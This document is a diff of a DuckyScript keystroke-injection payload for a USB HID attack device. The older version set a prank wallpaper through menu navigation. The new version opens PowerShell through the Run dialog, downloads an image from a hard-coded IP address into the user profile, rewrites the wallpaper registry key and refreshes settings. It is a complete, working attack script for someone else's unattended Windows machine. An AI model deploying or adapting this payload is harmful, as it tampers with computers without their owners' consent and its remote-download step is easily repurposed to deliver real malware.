@@ -1,54 +1,21 @@
 DELAY 100
 GUI r
 DELAY 100
-STRING http://3.bp.blogspot.com/-Bo5ZmBoppfQ/V2QrpZJfbKI/AAAAAAAAEOo/5HBzxidLniIl3lMcCpLERi5OAOwtKPPiACHM/s1600/david-hasselhoff-wallpaper-fischer-buzz.jpg
+STRING powershell
 DELAY 100
 ENTER
 DELAY 1500
-REM Open the picture in the default web browser
-CTRL s
-DELAY 1000
-STRING %userprofile%\Desktop\juanked
-DELAY 1000
-ENTER
-DELAY 1000
-GUI d
-DELAY 2000
-GUI r
-DELAY 100
-STRING %userprofile%\Desktop\juanked.jpg
-ENTER
-DELAY 2000
-MENU
-DELAY 1000
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-DELAY 10
-DOWNARROW
-ENTER
-DELAY 500
-DOWNARROW
-DOWNARROW
+STRING (New-Object Net.WebClient).DownloadFile("http://18.191.108.51/juanked_attack.bmp",$env:userprofile+"\juanked_attack.bmp")
 DELAY 100
 ENTER
-GUI d
+DELAY 3000
+STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $env:userprofile"\juanked_attack.bmp" /f
 DELAY 100
+ENTER
+STRING RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+DELAY 1000
+ENTER
+STRING exit
+DELAY 200
+ENTER
+ENTER
